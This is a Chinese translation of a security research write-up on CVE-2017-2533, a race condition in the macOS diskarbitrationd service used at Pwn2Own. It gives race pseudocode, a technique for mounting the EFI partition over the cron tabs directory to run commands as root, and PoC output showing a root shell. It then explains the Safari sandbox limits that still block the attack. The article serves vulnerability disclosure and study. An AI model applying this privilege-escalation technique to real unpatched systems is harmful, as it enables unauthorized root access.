> 原文链接: https://www.anquanke.com//post/id/86263 


# 【漏洞分析】Pwn2Own：Safari 沙箱逃逸(part 1)从磁盘挂载到权限提升


                                阅读量   
                                **95810**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：phoenhex.re
                                <br>原文地址：[https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc](https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p3.ssl.qhimg.com/t01c9b10b5193342cf3.jpg)](https://p3.ssl.qhimg.com/t01c9b10b5193342cf3.jpg)**

****

翻译：[**bllca**](http://bobao.360.cn/member/contribute?uid=102574511)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

今天我们带来 [CVE-2017-2533](https://support.apple.com/en-us/HT207797) / [ZDI-17-357](http://www.zerodayinitiative.com/advisories/ZDI-17-357/)，利用 macOS 系统服务中的条件竞争漏洞来提升权限。同时在此次 Pwn2Own 大赛中，我们还会组合多个漏逻辑洞来完成沙箱逃逸。

该漏洞主要存在于 [Disk Arbitration](https://developer.apple.com/library/content/documentation/DriversKernelHardware/Conceptual/DiskArbitrationProgGuide/Introduction/Introduction.html)（系统挂载通知服务）后台服务中，该服务主要用于管理 macOS 的磁盘挂载操作。比较有趣的是，尽管是处于沙盒模式的 Safari ，也能通过 [IPC 接口](https://developer.apple.com/documentation/diskarbitration)访问该服务。通过利用该漏洞，我们可以挂在某些未受 SIP 策略保护的目录，而幸运的是，在新版的 MacBook （译者未验证具体几年的版本）当中，存在一个 FAT32 分区，该分区主要用于磁盘恢复，而普通用户对该分区具有写权限。因此，我们可以通过该漏洞操作可写分区，最后完成权限提升。

<br>

**漏洞分析**

通过之前的 [Safari 渲染引擎](https://phoenhex.re/2017-06-02/arrayspread)漏洞，我们成功达到[命令执行](https://phoenhex.re/2017-05-04/pwn2own17-cachedcall-uaf)的目的。而进一步的，是想办法提升当前用户的权限。通过审计沙箱配置中的 mach-lookup 选项（mach-lookup 指令用于指定沙箱可访问的服务），我们尝试寻找 Safari 可以访问的服务进程，Safari 主要用过 IPC 接口与进程进行通信，该规则位于 /System/Library/Frameworks/WebKit.framework/Versions/A/Resources/com.apple.WebProcess.sb 文件中：

```
(allow mach-lookup
       (global-name "com.apple.DiskArbitration.diskarbitrationd")
       (global-name "com.apple.FileCoordination")
       (global-name "com.apple.FontObjectsServer")
       ...
```

如上面部分规则，Disk Arbitration 立马引起我们的重视，该服务位于 Apple 框架中，主要用于管理块设备（block devices），对设备提供基础的挂载和卸载操作，diskarbitrationd 服务主要负责分发 IPC 请求。匪夷所思，为啥浏览器渲染引擎需要挂载磁盘？于是我们以此为突破口对相关代码和进程行为进行审计。

```
$ ps aux | grep diskarbitrationd | grep -v grep
root                86   0.0  0.0  2494876   2132   ??  Ss   Wed10AM   0:00.37 /usr/libexec/diskarbitrationd
$ sudo launchctl procinfo $(pgrep diskarbitrationd) | grep sandboxed
sandboxed = no
```

首先，和预期一样，diskarbitrationd 服务运行于 root 上下文中（主要是为了执行 mount 系统调用），并未受沙箱保护。为了进行全面验证，我们使用 Swift 编写了一个验证程序，并使用com.apple.WebProcess.sb 规则将程序运行于沙箱中，确实能正常访问该服务。因此，diskarbitrationd 服务非常适合作为利用的场景，于是我们开始着手对源码进行审计，旧版本源码可以从 [Apple 源码仓库](https://opensource.apple.com/tarballs/DiskArbitration/DiskArbitration-288.1.1.tar.gz) 下载。

当我尝试寻找内存损坏（memory corruption）漏洞时，在 DARequest.c 的代码实现中发现了有趣的东西，第 510 行（这里没有行号23333）：

```
/*
     * Determine whether the mount point is accessible by the user.
     */
    if ( DADiskGetDescription( disk, kDADiskDescriptionVolumePathKey ) == NULL )
    `{`
        if ( DARequestGetUserUID( request ) )
        `{`
            CFTypeRef mountpoint;
            mountpoint = DARequestGetArgument2( request );
            // [...]
            if ( mountpoint )
            `{`
                char * path;
                path = ___CFURLCopyFileSystemRepresentation( mountpoint );
                if ( path )
                `{`
                    struct stat st;
                    if ( stat( path, &amp;st ) == 0 )
                    `{`
                        if ( st.st_uid != DARequestGetUserUID( request ) )
                        `{`
                            // [[ 1 ]]
                            status = kDAReturnNotPermitted;
                        `}`
                    `}`
```

此处代码的实现，主要是用于防止用户将分区挂载到没有权限的目录，例如 /etc、/System 等。阅读此处代码，大致实现流程如下：首先，如果挂载点已经存在，但是不属于某个用户，则返回 kDAReturnNotPermitted 错误代码，相反则正常进行挂载。而在此之后，并没有任何安全机制对操作进行验证，于此同时，由于 diskarbitrationd 服务位于 root 上下文，因而我们可以对没有受 [SIP](https://support.apple.com/en-us/HT204899) 保护的目录进行任意操作。

那么漏洞存在哪里？其实这里存在一个条件竞争问题，即安全检查时间 vs. 挂载时间（time of check vs. time of use）：如果挂载点在检查之后，磁盘挂载之前创建，则不会进入权限检验流程，而在绕过检测流程后，也就是，我们在挂载流程进入之前，创建一个软链接指向任意目录，最终对目标目录进行挂载。

Apple 团队已经在 macOS Sierra 10.12.5 中发布了最新更新补丁，但是源码暂时还未公布到仓库。后续我们将会更新本文的代码，对此进行比较。

<br>

**构建 PoC**

整理一下思路，我们使用伪代码来演示，如何利用该漏洞将任意设备挂载到 /etc 目录下：

```
disk = "/dev/some-disk-device"
in the background:
  while true:
    建立软链接 "/tmp/foo" 指向 "/"
    删除软链接
while disk not mounted at "/etc":
  向 diskarbitrationd 发送 IPC 请求，将磁盘挂载到 "/tmp/foo/etc"
```

首先我们会向 diskarbitrationd 发送请求，挂在磁盘到特定目录，如果竞争操作成功，则挂载点被删除，check 函数被绕过。同时，挂载点重新被创建，最后进入挂载流程。但是需要注意的是，我们暂时没有权限对 /etc 目录进行操作，除非使用 sudo 对用户权限进行提升。

对于完成最终的权限提升，我们还需要解决两个问题：

1. Mac 中是否存在一个没有被挂载，但是本地用户可写的磁盘

2. 将磁盘挂载到哪个目录，该目录下运行程序是通过 root 上下文进行的

第一个问题比较容易解决，我们可以列出所有可用的磁盘：

```
$ ls -alih /dev/disk*
589 brw-r-----  1 root  operator    1,   0 Mar 15 10:27 /dev/disk0
594 brw-r-----  1 root  operator    1,   1 Mar 15 10:27 /dev/disk0s1
598 brw-r-----  1 root  operator    1,   3 Mar 15 10:27 /dev/disk0s2
596 brw-r-----  1 root  operator    1,   2 Mar 15 10:27 /dev/disk0s3
600 brw-r-----  1 root  operator    1,   4 Mar 15 10:27 /dev/disk1
```

其中 /dev/dis0s1 满足我们的需求，该分区是 EFI 分区，格式为 FAT32，主要用于 BIOS 固件更新和启动引导，并存在于几乎所有版本的 MacBook 设备中。通常情况下，该设备并没有挂载。而由于该分区属于 FAT 格式，并不支持 Unix* 的文件权限管理，所以我们可以正常对其进行写入操作。

除此之外，我想还可以通过 [hdiutil](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/hdiutil.1.html) 来建立一个可写设备，但是在默认策略下，没有利用成功。

第二个问题稍微有点棘手，花了一点时间。即使在新版 macOS 中，也有 [cron 服务](https://en.wikipedia.org/wiki/Cron) 的背影，但是该服务默认并没有运行。然而当我们在 /var/at/tabs 建立任务文件时，launchd 会自动启动 cron 进程来完成任务调度。因此，我们可以将磁盘挂载到 /var/at/tabs，并在 /var/at/tabs/root 下写入 payload，最终以 root 身份执行命令：

```
* * * * * touch /tmp/pwned
```

该指令会在每分钟执行一次，当然，使用的是 root 权限。至此，我们成功利用该漏洞完成权限提升，PoC 代码可以 [访问这里](https://github.com/phoenhex/files/blob/master/pocs/poc-mount.sh) 进行下载，注意需要安装 clang 编译器：

```
$ ./poc-mount.sh
Just imagine having that root shell. It's gonna be legen...
wait for it...
dary!
./poc-mount.sh: line 77:  3179 Killed: 9               race_link
sh-3.2# id
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),401(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
sh-3.2#
```

其实，该漏洞类似于 Windows 操作系统下的 UAC bypass，我们可以结合其他漏洞作为一个向量，进一步攻击目标。

<br>

**进一步研究沙盒逃逸**

对于调用 Disk Arbitration 服务提供的 API，我们需要提供一个[验证令牌](https://developer.apple.com/reference/security/authorization_services)（authorization token）。当我们发起一个挂载请求时，diskarbitrationd 服务会检查 token 中的 system.volume.*.mount 权限，* 代表我们要挂在的磁盘类型。例如，当我们对 /dev/disk0s1 内部磁盘（internal disk partition）进行挂载时，diskarbitrationd 在 DAAuthorize 函数中会对 token 进行验证（system.volume.internal.mount）：

```
DAReturn status;
status = kDAReturnNotPrivileged;
    // ...
    AuthorizationRef authorization;
    // [[ 1 ]]
    authorization = DASessionGetAuthorization( session );
    if ( authorization )
    `{`
        AuthorizationFlags  flags;
        AuthorizationItem   item;
        char *              name;
        AuthorizationRights rights;
        flags = kAuthorizationFlagExtendRights;
        // ...
                        if ( DADiskGetDescription( disk, kDADiskDescriptionDeviceInternalKey ) == kCFBooleanTrue )
                        `{`
                            // [[ 2 ]]
                            asprintf( &amp;name, "system.volume.internal.%s", right );
                        `}`
        // ...
        if ( name )
        `{`
            item.flags       = 0;
            item.name        = name;
            item.value       = NULL;
            item.valueLength = 0;
            rights.count = 1;
            rights.items = &amp;item;
            // [[ 3 ]]
            status = AuthorizationCopyRights( authorization, &amp;rights, NULL, flags, NULL );
            if ( status )
            `{`
                status = kDAReturnNotPrivileged;
            `}`
            free( name );
        `}`
    `}`
```

在步骤 [[ 1 ]] 中，程序从当前会话中取出用户令牌，该令牌由该 IPC 请求发起者提供。接着在步骤 [[ 2 ]] 中生成 system.volume.internal.mount 权限标志，最后在 [[ 3 ]] 中，使用 AuthorizationCopyRights 函数来检查用户令牌是否具有该权限。[AuthorizationCopyRights ](https://developer.apple.com/reference/security/1395770-authorizationcopyrights?language=objc)则在 com.apple.authd 服务中实现。

<br>

**在 Safari 沙箱中触发漏洞**

我们总结一下当前的条件，看看能否触发在沙箱环境中的 Safari 触发该漏洞：

通过 IPC 接口访问 diskarbitrationd 服务 – √

向任意目录写入内容 – √

我们只需要找到一个 Safari 可写的目录即可，我们会在该目录下建立软链接，最终将其挂载到 /var/at/tabs 下。而在 WebProcess.sb 的沙箱规则中：

```
(if (positive? (string-length (param "DARWIN_USER_CACHE_DIR")))
    (allow file* (subpath (param "DARWIN_USER_CACHE_DIR"))))
```

我们对 /private/var/folders/&lt;随机字符&gt;/C/com.apple.WebKit.WebContent+com.apple.Safari 下的所有目录具有可写权限。

获取验证令牌 – ×

虽然本地用户可以正常获取到验证令牌，但是在沙箱环境下，除非指定明确的规则，否则无法创建正确的访问令牌。不幸的是，WebProcess.sb 并没有指定该选项（allow authorization-right-obtain ），因此我们无法通过该途径进行利用。

允许建立软链接 – ×

Safari 沙箱明令禁止任何链接创建操作：

```
(if (defined? 'vnode-type)
        (deny file-write-create (vnode-type SYMLINK)))
```

在下一篇文章中，我们将会带来更多的漏洞信息，使用这些漏洞，我们可以绕过软链接创建限制，并且绕过沙箱的验证权限检查。
